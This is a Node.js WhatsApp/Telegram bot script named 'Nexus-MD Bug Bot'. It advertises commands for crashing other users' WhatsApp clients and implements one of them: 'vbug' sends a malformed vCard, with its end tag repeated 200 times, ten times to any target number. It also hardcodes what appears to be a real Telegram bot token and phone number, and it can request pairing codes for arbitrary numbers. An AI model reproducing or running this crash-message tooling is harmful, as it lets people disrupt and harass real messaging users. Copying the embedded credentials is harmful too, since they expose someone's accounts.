const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    getContentType,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require("pino");

// --- CONFIGURATIONS ---
const tgToken = '8246779983:AAEDuC8a7QMd2OwNvLDJvDGGwLkFk5nc9k8';
const ownerNumber = "94770475809";
const tgBot = new TelegramBot(tgToken, { polling: true });

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-Hybrid", "Chrome", "20.0.04"]
    });

    // --- WHATSAPP PAIRING FOR OWNER (94770475809) ---
    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            let code = await sock.requestPairingCode(ownerNumber);
            console.log(`\n🔥 WHATSAPP PAIRING CODE: ${code}\n`);
            tgBot.sendMessage(ownerNumber, `🚀 Nexus-MD WhatsApp Pairing Code: ${code}`); // ටෙලිග්‍රෑම් එකටත් කෝඩ් එක එනවා
        }, 6000);
    }

    sock.ev.on('creds.update', saveCreds);

    // --- TELEGRAM CONTROL ---
    tgBot.onText(/\/start/, (msg) => {
        tgBot.sendMessage(msg.chat.id, "👋 Welcome to Nexus-MD Bug System!\n\nUse /menu to see commands.");
    });

    // --- WHATSAPP MESSAGE HANDLING ---
    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid;
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        const prefix = ".";
        if (!body.startsWith(prefix)) return;
        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);

        // --- COMMAND 1: THE ULTIMATE MENU ---
        if (command === 'menu') {
            let menu = `⚡ *NEXUS-MD BUG BOT* ⚡\n\n` +
                       `👾 *BUG CATEGORIES:* \n` +
                       `◈ ${prefix}vbug - Vcard Crash\n` +
                       `◈ ${prefix}cbug - Char Overflow\n` +
                       `◈ ${prefix}lbug - Location Freeze\n` +
                       `◈ ${prefix}ibug - Image Crash\n` +
                       `◈ ${prefix}vobug - Video Overflow\n\n` +
                       `🔗 *PAIRING:* \n` +
                       `◈ ${prefix}bot [නම්බර්] - Get Pairing Code\n\n` +
                       `🛡️ *Status:* Anti-Ban Active\n` +
                       `🚀 *System:* Hybrid (WA + TG)`;
            
            await sock.sendMessage(from, { text: menu });
        }

        // --- COMMAND 2: PUBLIC PAIRING SYSTEM ---
        if (command === 'bot') {
            let target = args[0]?.replace(/[^0-9]/g, '');
            if (!target) return sock.sendMessage(from, { text: "❌ නම්බර් එකත් එක්ක ගහපන් බන්." });

            sock.sendMessage(from, { text: "⏳ පෝලිමේ ඉන්න... කෝඩ් එක හදනවා." });
            const { state: tState } = await useMultiFileAuthState(`temp_${target}`);
            const tSock = makeWASocket({ auth: tState, logger: pino({ level: "silent" }) });

            setTimeout(async () => {
                let code = await tSock.requestPairingCode(target);
                await sock.sendMessage(from, { text: `🔥 *YOUR PAIRING CODE:* ${code}` });
            }, 5000);
        }

        // --- COMMAND 3: VCARD ATTACK ---
        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(200);
            
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
            }
            sock.sendMessage(from, { text: "✅ Attack Sent Successfully!" });
        }
        
        // උඹට ඕන නම් මෙතනට තව Command 100ක් උනත් ඇඩ් කරන්න පුළුවන්...
    });

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') console.log('✅ Nexus Hybrid Online!');
        if (connection === 'close') startNexus();
    });
}

startNexus();
